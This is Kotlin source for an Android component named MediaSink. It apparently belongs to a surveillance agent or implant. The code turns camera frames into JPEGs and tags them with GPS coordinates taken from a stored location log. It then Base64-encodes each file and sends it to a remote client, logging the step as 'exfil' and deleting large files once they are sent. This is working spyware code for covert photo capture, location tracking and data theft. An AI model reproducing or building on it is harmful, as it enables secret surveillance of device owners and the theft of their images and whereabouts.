package ai.obsidian.agent.media

import ai.obsidian.agent.AgentApp
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.media.ExifInterface
import android.util.Base64
import androidx.camera.core.ImageProxy
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File

object MediaSink {

    fun toJpeg(image: ImageProxy): ByteArray {
        val buffer = image.planes[0].buffer
        val raw = ByteArray(buffer.remaining())
        buffer.get(raw)

        if (image.format == ImageFormat.JPEG) return raw

        val bitmap = BitmapFactory.decodeByteArray(raw, 0, raw.size)
            ?: return raw
        val output = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 85, output)
        bitmap.recycle()
        return output.toByteArray()
    }

    fun deliver(app: AgentApp, jpeg: ByteArray, tag: String) {
        val target = app.store.file("${tag}_${System.currentTimeMillis()}.jpg")
        target.writeBytes(jpeg)
        stampLocation(app, target)
        deliverFile(app, target, tag)
    }

    private fun stampLocation(app: AgentApp, file: File) {
        runCatching {
            val last = app.store.tail("loc.log", 1).trim()
            if (last.isEmpty()) return
            val coordinates = last.substringAfter(' ').substringBefore(' ')
            val parts = coordinates.split(',')
            if (parts.size != 2) return

            val exif = ExifInterface(file.absolutePath)
            exif.setAttribute(ExifInterface.TAG_GPS_LATITUDE, parts[0])
            exif.setAttribute(ExifInterface.TAG_GPS_LATITUDE_REF, if (parts[0].toDouble() >= 0) "N" else "S")
            exif.setAttribute(ExifInterface.TAG_GPS_LONGITUDE, parts[1])
            exif.setAttribute(ExifInterface.TAG_GPS_LONGITUDE_REF, if (parts[1].toDouble() >= 0) "E" else "W")
            exif.saveAttributes()
        }
    }

    fun deliverFile(app: AgentApp, file: File, tag: String) {
        app.audit.info("exfil", "$tag ${file.name} ${file.length()}")
        val encoded = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
        app.scope.launch {
            runCatching { app.requireClient().send("chunk", "FILE $tag ${file.name}\n$encoded") }
                .onFailure { app.audit.warn("send", it.message.orEmpty()) }
        }
        if (file.length() > LARGE_FILE_BYTES) file.delete()
    }

    private const val LARGE_FILE_BYTES = 2_000_000L
}
